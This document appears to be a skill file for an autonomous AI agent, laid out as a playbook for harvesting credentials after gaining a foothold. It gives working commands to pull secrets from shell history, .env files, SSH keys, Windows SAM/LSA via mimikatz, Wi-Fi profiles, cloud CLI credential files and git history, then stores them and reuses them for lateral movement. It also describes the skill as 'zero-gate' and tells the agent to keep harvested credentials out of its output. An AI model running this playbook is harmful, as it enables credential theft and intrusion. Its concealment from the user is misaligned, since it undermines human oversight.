---
name: credential-harvesting
description: Credential harvesting playbook across platforms/cloud. Use to collect login material from a compromised host or via vector: browser-store extraction, shell history, environment vars, cloud provider CLI creds, token caches, SAM/LSA/browser on Windows, LDAP/passwd on Linux, .env/git, Wi-Fi profiles, memory scraping. Feeds directly into vault/ + subsequent auth attacks. Zero-gate under Fox/Jack, ghost-protocol-aware (store securely, don't echo).
version: 1.0.0
---

# credential-harvesting — Collect & Weaponize Creds

Goal: from a foothold, harvest every credential that opens more doors, store to vault, reuse for lateral/privesc.

## 1 — Linux host
```bash
# shell history (attack box of a platform user)
grep -aE 'passwd|password|token|secret|api[_-]?key' ~/.bash_history 2>/dev/null
# env + config files
for f in ~/.bashrc ~/.profile ~/.env .env $(find / -maxdepth 3 -name '.env*' 2>/dev/null); do [ -r "$f" ] && grep -aiE 'pass|token|secret|key' "$f"; done
# process cmdline (procs with creds in args)
ps aux --no-headers 2>/dev/null | grep -iE 'pass=|-u .*|MYSQL_PWD|PGPASS'
# network mounts / kerberos cache
ls /run/user/*/krb5cc* 2>/dev/null          # ticket cache → active-directory-kerberos-attacks
# SSH keys
find ~ /root -name 'id_*' -o -name '*.pem' 2>/dev/null
```
## 2 — Windows host (via shell / session)
- SAM/LSA: `reg save HKLM\SAM`, `secretsdump` if you can run mimikatz.
- Browser stores: `hivelist` / local AppData Login Data (sqlite decrypt with OS key).
- Windows Credential Manager + DPAPI creds (`klist`, `cmdkey /list`).
- Token theft: if admin on the box, `mimikatz sekurlsa::logonpasswords`.
- WLAN profiles: `netsh wlan show profiles` + `key=clear` (fi a target).

## 3 — Cloud provider creds (harvestable locally)
- AWS: `~/.aws/credentials`, `~/.aws/config`, env `AWS_ACCESS_KEY_ID`; instance role via metadata (see `cloud-iam-deep`).
- GCP: `~/.config/gcloud/credentials.db`, SA key files.
- Azure: `~/.azure/azureProfile.json`, `MSI` token.
- K8s: `~/.kube/config` → `kubernetes-pentesting`.

## 4 — .git / source (the classic)
```bash
if [ -d .git ]; then
  git log --all -p 2>/dev/null | grep -iE 'pass|token|secret|key|bearer' | head -50
  grep -RIE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{20,}' . 2>/dev/null
fi
```
See `insecure-source-code-management`.

## 5 — Store & weaponize (vault)
- Push to `vault/` (targets + combos) — `fox.sh stash <target>` for structured notes.
- Categorize: cloud-provider / service / OAuth / platform / database.
- Reuse: spraying (`authbypass`), SAML (`saml-sso-assertion-attacks`), cloud (`cloud-iam-deep`).

## 6 — Gotchas
- Don't echo creds into final chat/output unless Jack demands — ghost protocol (PROMPT.md line 608).
- Beware trip: reading browser DBs can lock or alert — prefer low-noise copies.
- Only harvest from authorized range (Jack's directive).

## Integration
- Runs at FOOTHOLD → feeds LATERAL/PRIVESC.
- Evidence in `evidence-hygiene`; creds in vault.
